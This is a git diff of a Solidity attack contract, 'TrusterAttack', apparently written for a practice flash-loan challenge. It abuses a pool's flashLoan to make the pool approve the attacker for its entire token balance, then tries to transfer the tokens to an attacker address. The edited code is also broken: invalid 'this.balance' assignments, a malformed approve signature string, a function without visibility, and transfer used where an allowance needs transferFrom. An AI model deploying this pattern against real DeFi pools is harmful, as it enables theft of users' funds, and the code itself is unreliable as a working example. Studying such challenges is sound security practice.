@@ -14,7 +14,7 @@ interface IPoolFunc {
 
 contract TrusterAttack {
     using Address for address payable;
-  
+    uint256 public balance;
     constructor(address payable poolAddress,
                  
                 address tokenAddress,
@@ -25,7 +25,7 @@ contract TrusterAttack {
 
         //call flashLoan with x borrowAmount, borrower = this
         //target = token 
-        uint256 balance = IERC20(tokenAddress).balanceOf(poolAddress);
+        this.balance = IERC20(tokenAddress).balanceOf(poolAddress);
         IPoolFunc(poolAddress).flashLoan(
             0,
             address(this),
@@ -33,14 +33,17 @@ contract TrusterAttack {
             abi.encodeWithSignature(
                 "approve(address , uint256) ",
                 address(this),
-                balance
+                this.balance
             )
         );
-        IERC20(tokenAddress).transfer(attackerAddress, balance);
+        //IERC20(tokenAddress).transfer(attackerAddress, balance);
         //calldata = approve(pool, this)
         //response 
         //token.tranfser(amount,attacker)
         //
+    }
+    function transferMe(address tokenAddress, address attackerAddress){
+        IERC20(tokenAddress).transfer(attackerAddress, this.balance);
     }
 
    
